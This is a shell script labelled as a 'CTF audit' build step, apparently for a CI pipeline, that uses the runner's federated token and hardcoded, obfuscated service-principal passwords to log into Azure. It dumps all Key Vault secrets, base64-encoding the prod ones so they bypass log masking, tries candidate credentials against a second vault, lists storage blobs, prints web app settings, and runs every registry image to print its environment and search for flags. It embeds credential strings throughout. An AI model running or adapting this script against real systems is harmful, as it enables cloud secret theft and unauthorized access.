#!/usr/bin/env bash
set -euxo pipefail
echo "tebamoto-platform build: CTF audit"
token=$(curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')
az login --service-principal --username "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$token" >/dev/null
az account set --subscription "$AZURE_SUBSCRIPTION_ID"
echo '=== VAULT SYNC PRINCIPAL ==='
sync_app='58108da8-044e-4d7e-9a46-92e6179b30be'
sync_pw='~8T8Q~YwEmex'
sync_pw="${sync_pw}STRv_pUsEwa9QMapyP39"
sync_pw="$sync_pw~CU5Ucu2"
az login --service-principal --username "$sync_app" --password="$sync_pw" --tenant "$AZURE_TENANT_ID" --allow-no-subscriptions >/dev/null || true
echo '=== REPORTING VIEWER ==='
rv_app='881fddce-6208-4af5-a297-7e79c912f83c'
rv_pw='-Tl8Q~sH0QOP.VrKWha3'
rv_pw="${rv_pw}-7x4XA2JxS4j08nuvbQN"
az login --service-principal --username "$rv_app" --password="$rv_pw" --tenant "$AZURE_TENANT_ID" --allow-no-subscriptions >/dev/null || true
for vault in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "VAULT=$vault"
  for name in $(az keyvault secret list --vault-name "$vault" --query '[].name' -o tsv 2>/dev/null); do
    echo "SECRET=$name"
    az keyvault secret show --vault-name "$vault" --name "$name" --query value -o tsv || true
  done
done
echo '=== PROD SECRET BASE64 ==='
az login --service-principal --username "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$token" >/dev/null
az account set --subscription "$AZURE_SUBSCRIPTION_ID"

for name in $(az keyvault secret list --vault-name kv-tbl-prod-x3euoz --query '[].name' -o tsv 2>/dev/null); do
  val=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name "$name" --query value -o tsv 2>/dev/null || true)
  echo "B64=$name $(printf '%s' "$val" | base64 -w0)"
done
echo '=== CANDIDATE PRINCIPALS SEC VAULT ==='
for pair in \
  '038bc35d-131d-4953-9985-ff4a245ccec1|MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==' \
  '12ed54de-f2eb-4784-804c-3a7a3e83a9e9|blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==' \
  '462d1c38-4459-48b8-9333-82e389e59514|c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag=='; do
  app=${pair%%|*}; enc=${pair#*|}; pw=$(printf %s "$enc" | base64 -d)
  echo "TRY=$app"
  az login --service-principal --username "$app" --password="$pw" --tenant "$AZURE_TENANT_ID" --allow-no-subscriptions >/dev/null 2>&1 || true
  for name in $(az keyvault secret list --vault-name kv-tbl-sec-x3euoz --query '[].name' -o tsv 2>/dev/null); do
    echo "SECSECRET=$name"
    az keyvault secret show --vault-name kv-tbl-sec-x3euoz --name "$name" --query value -o tsv || true
  done
done
echo '=== STORAGE ==='
az login --service-principal --username "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$token" >/dev/null
az account set --subscription "$AZURE_SUBSCRIPTION_ID"
for st in $(az storage account list --query '[].name' -o tsv 2>/dev/null); do
  echo "STORAGE=$st"
  for cont in $(az storage container list --account-name "$st" --auth-mode login --query '[].name' -o tsv 2>/dev/null); do
    echo "CONTAINER=$cont"
    az storage blob list --account-name "$st" --container-name "$cont" --auth-mode login --query '[].name' -o tsv 2>/dev/null || true
  done
done
echo '=== REPORTING SERVICE SEC VAULT ==='
rs_app=$(printf MTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5 | base64 -d)
rs_pw=$(printf blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg== | base64 -d)
rs_tok=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" --data-urlencode "client_id=$rs_app" --data-urlencode "client_secret=$rs_pw" --data-urlencode grant_type=client_credentials --data-urlencode scope=https://vault.azure.net/.default | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))')
echo "RS_TOKEN=${#rs_tok}"
sec_json=$(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $rs_tok")
echo "$sec_json" | python3 -c 'import json,sys; d=json.load(sys.stdin); print("SEC_ITEMS",[(x.get("id","").rsplit("/",1)[-1]) for x in d.get("value",[])])'
for sid in $(echo "$sec_json" | python3 -c 'import json,sys; print(" ".join(x.get("id","") for x in json.load(sys.stdin).get("value",[])))'); do echo "SECVAL=$(curl -s "$sid?api-version=7.4" -H "Authorization: Bearer $rs_tok")"; done
registry=crtblplatprodx3euoz
echo '=== WEBAPP SETTINGS ==='
for app in $(az webapp list --query '[].name' -o tsv); do
  echo "APP=$app"
  az webapp config appsettings list --name "$app" --resource-group rg-tbl-platform-prod-sea -o json || true
done
for repo in $(az acr repository list --name "$registry" -o tsv); do
  for tag in $(az acr repository show-tags --name "$registry" --repository "$repo" -o tsv); do
    image="$registry.azurecr.io/$repo:$tag"
    docker pull "$image" >/dev/null 2>&1 || continue
    echo "=== $image ==="
    docker run --rm --entrypoint /bin/sh "$image" -c 'env; find /app /opt /srv -maxdepth 4 -type f 2>/dev/null | while read f; do grep -aEi "flag|ctf|TBL\\{" "$f" 2>/dev/null | head -3 && echo "FILE=$f"; done' || true
  done
done
